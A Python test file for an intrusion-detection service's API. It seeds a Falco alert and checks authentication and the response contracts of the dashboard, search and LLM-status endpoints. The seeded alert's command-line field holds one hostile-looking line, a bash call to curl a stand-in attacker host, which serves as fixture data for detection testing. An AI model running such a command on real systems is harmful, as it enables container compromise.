from datetime import datetime, timezone
import sys
import types

from fastapi.testclient import TestClient


# Provide a minimal prometheus_client shim if dependency is unavailable in local test env.
try:
    import prometheus_client  # noqa: F401
except Exception:
    class _Metric:
        def labels(self, *args, **kwargs):
            return self

        def inc(self, *args, **kwargs):
            return None

        def set(self, *args, **kwargs):
            return None

        def observe(self, *args, **kwargs):
            return None

    shim = types.SimpleNamespace(
        CONTENT_TYPE_LATEST="text/plain; version=0.0.4",
        Counter=lambda *args, **kwargs: _Metric(),
        Gauge=lambda *args, **kwargs: _Metric(),
        Histogram=lambda *args, **kwargs: _Metric(),
        generate_latest=lambda: b"",
    )
    sys.modules["prometheus_client"] = shim

# Provide a minimal openai shim if SDK is unavailable in local test env.
try:
    import openai  # noqa: F401
except Exception:
    class _DummyAsyncOpenAI:
        def __init__(self, *args, **kwargs):
            self.chat = types.SimpleNamespace(
                completions=types.SimpleNamespace(
                    create=self._create
                )
            )

        async def _create(self, *args, **kwargs):
            raise RuntimeError("openai SDK unavailable in local test environment")

    sys.modules["openai"] = types.SimpleNamespace(AsyncOpenAI=_DummyAsyncOpenAI)

# Provide a minimal kubernetes shim if SDK is unavailable in local test env.
try:
    import kubernetes  # noqa: F401
except Exception:
    class _DummyApi:
        def __getattr__(self, name):
            def _noop(*args, **kwargs):
                return None
            return _noop

    class _DummyApiException(Exception):
        def __init__(self, status=500, *args, **kwargs):
            super().__init__(*args)
            self.status = status

    kube_client_mod = types.SimpleNamespace(
        AppsV1Api=lambda *args, **kwargs: _DummyApi(),
        CoreV1Api=lambda *args, **kwargs: _DummyApi(),
        NetworkingV1Api=lambda *args, **kwargs: _DummyApi(),
    )
    kube_config_mod = types.SimpleNamespace(
        load_incluster_config=lambda: (_ for _ in ()).throw(Exception("no incluster config")),
        load_kube_config=lambda: None,
    )
    kube_rest_mod = types.SimpleNamespace(ApiException=_DummyApiException)

    sys.modules["kubernetes"] = types.SimpleNamespace(client=kube_client_mod, config=kube_config_mod)
    sys.modules["kubernetes.client"] = kube_client_mod
    sys.modules["kubernetes.config"] = kube_config_mod
    sys.modules["kubernetes.client.rest"] = kube_rest_mod


sys.path.insert(0, "services/ids-api/src")
from main import app, operator_interface  # noqa: E402


client = TestClient(app)


def _auth_headers():
    resp = client.post("/api/auth/login", json={"username": "operator", "password": "operator"})
    assert resp.status_code == 200, resp.text
    token = resp.json()["access_token"]
    return {"Authorization": f"Bearer {token}"}


def _seed_operator_incidents():
    operator_interface.incident_cache.clear()
    operator_interface.incidents_by_date.clear()
    now = datetime.now(timezone.utc).isoformat().replace("+00:00", "Z")

    operator_interface.build_incident_for_operator(
        alert_id=9901,
        alert_data={
            "output": "Falco detected suspicious process in traffic-camera",
            "priority": "High",
            "rule": "Unexpected process",
            "time": now,
            "output_fields": {
                "container.name": "traffic-camera-001",
                "proc.cmdline": "/bin/bash -c curl attacker.example",
            },
        },
        analysis={
            "summary": "Suspicious process execution detected.",
            "severity": 8,
            "threat_type": "Unauthorized Access",
            "confidence": 0.82,
            "key_indicators": ["Unexpected bash process"],
            "mitigating_factors": [],
            "business_impact": "Potential camera service compromise.",
            "reasoning": "Runtime behavior indicates possible unauthorized access.",
            "recommendations": ["Isolate pod", "Collect logs"],
            "automated_actions": ["isolate_pod", "collect_logs"],
        },
        llm_model_used="openai",
        analysis_duration_ms=450,
        automation_mode="assisted",
        protected_services=[],
    )


def test_auth_required_for_operator_and_llm_endpoints():
    protected_paths = [
        "/api/operator/search",
        "/api/operator/dashboard",
        "/api/llm/status",
        "/api/governance/status",
    ]
    for path in protected_paths:
        resp = client.get(path)
        assert resp.status_code in (401, 403), f"{path} should require auth"


def test_response_contracts_for_search_dashboard_and_llm_status():
    headers = _auth_headers()
    _seed_operator_incidents()

    dashboard_resp = client.get("/api/operator/dashboard", headers=headers)
    assert dashboard_resp.status_code == 200, dashboard_resp.text
    dashboard = dashboard_resp.json()
    for key in ("summary", "severity_distribution", "threat_distribution", "recent_timeline", "incidents"):
        assert key in dashboard
    for summary_key in ("total_incidents", "critical_incidents", "pending_approval", "avg_analysis_time_ms", "avg_confidence"):
        assert summary_key in dashboard["summary"]
    assert isinstance(dashboard["incidents"], list)
    assert dashboard["incidents"], "Expected seeded incident in dashboard list"

    incident_entry = dashboard["incidents"][0]
    for key in ("id", "timestamp", "severity", "summary", "threat_type", "confidence", "requires_approval", "llm_model", "business_impact"):
        assert key in incident_entry

    search_resp = client.get("/api/operator/search?query=unauthorized&limit=10", headers=headers)
    assert search_resp.status_code == 200, search_resp.text
    search_results = search_resp.json()
    assert isinstance(search_results, list)
    assert search_results, "Expected at least one search result"
    for key in ("id", "timestamp", "severity", "summary", "threat_type", "confidence", "requires_approval"):
        assert key in search_results[0]

    llm_resp = client.get("/api/llm/status", headers=headers)
    assert llm_resp.status_code == 200, llm_resp.text
    llm_status = llm_resp.json()
    for key in ("provider_count", "providers", "priority_order", "details"):
        assert key in llm_status
    assert isinstance(llm_status["provider_count"], int)
    assert isinstance(llm_status["providers"], list)
    assert isinstance(llm_status["priority_order"], list)
    assert isinstance(llm_status["details"], dict)
